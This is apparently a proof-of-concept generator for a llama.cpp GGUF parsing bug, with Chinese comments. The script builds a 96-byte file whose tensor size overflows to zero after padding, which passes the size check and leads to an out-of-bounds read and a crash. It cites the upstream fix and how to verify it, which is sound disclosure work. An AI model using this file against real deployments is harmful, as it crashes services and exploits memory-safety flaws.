#!/usr/bin/env python3
"""gen_pad_wrap_gguf.py —— llama.cpp#26978 / PR#26979 的 PoC 生成器

构造一个 GGUF 文件，其张量声明尺寸使 ggml_nbytes = 2^64 - 16：
    ne = [4, 1073741823, 1073741825, 1]，F32（4 字节）
    4 * 4 * (2^30 - 1) * (2^30 + 1) = 16 * (2^60 - 1) = 2^64 - 16

漏洞链（当前 master，ggml/src/gguf.cpp gguf_init_from_reader）：
    padded_size = GGML_PAD(ggml_nbytes, alignment)   # 2^64-16 + 31 回绕 → 0
    if (SIZE_MAX - ctx->size < padded_size) reject   # 检查的是回绕后的 0，恒过
    ctx->size += padded_size                          # 尺寸账本失真
→ 解析器接受该文件；下游按声明尺寸遍历即越界读（示例工具 abort）。

修复（PR#26979）：在 PAD 之前检查 nbytes > SIZE_MAX - (alignment-1) 即拒绝。

用法：
    python3 gen_pad_wrap_gguf.py /tmp/pad_wrap.gguf
验证：
    bin/llama-gguf /tmp/pad_wrap.gguf r
    2026-08-23 验证的 master：接受文件后越界读取并 SIGSEGV（本 96-byte PoC rc=139）
    PR#26979：解析期拒绝（"overflows after padding" 一类错误）

上游 issue 的双张量 384-byte PoC 会先触发示例工具断言（rc=134）；两者都证明解析器
接受了已经回绕的尺寸，但退出码不能跨 PoC 混用。
"""
import struct
import sys

MAGIC = b"GGUF"
VERSION = 3
GGML_TYPE_F32 = 0


def gguf_string(s: str) -> bytes:
    b = s.encode("utf-8")
    return struct.pack("<Q", len(b)) + b


def main() -> None:
    out = sys.argv[1] if len(sys.argv) > 1 else "/tmp/pad_wrap.gguf"
    buf = bytearray()
    buf += MAGIC
    buf += struct.pack("<I", VERSION)
    buf += struct.pack("<Q", 1)  # tensor_count
    buf += struct.pack("<Q", 0)  # metadata_kv_count
    # tensor: name, n_dims, dims, type, offset
    buf += gguf_string("b")
    buf += struct.pack("<I", 3)             # n_dims = 3
    buf += struct.pack("<Q", 4)             # ne[0]
    buf += struct.pack("<Q", 1073741823)    # ne[1] = 2^30 - 1
    buf += struct.pack("<Q", 1073741825)    # ne[2] = 2^30 + 1
    buf += struct.pack("<I", GGML_TYPE_F32)
    buf += struct.pack("<Q", 0)             # offset
    # 补齐到对齐的数据区起点，使示例读取器的 seek 成功，
    # 让解析走到尺寸累加路径（漏洞触发点）。
    data_offset = ((len(buf) + 31) // 32) * 32
    buf += b"\x00" * (data_offset - len(buf))
    with open(out, "wb") as f:
        f.write(buf)
    nbytes = 4 * 4 * 1073741823 * 1073741825
    print(f"written {out} ({len(buf)} bytes); declared tensor nbytes = {nbytes} "
          f"(= 2^64 - {2**64 - nbytes})")


if __name__ == "__main__":
    main()
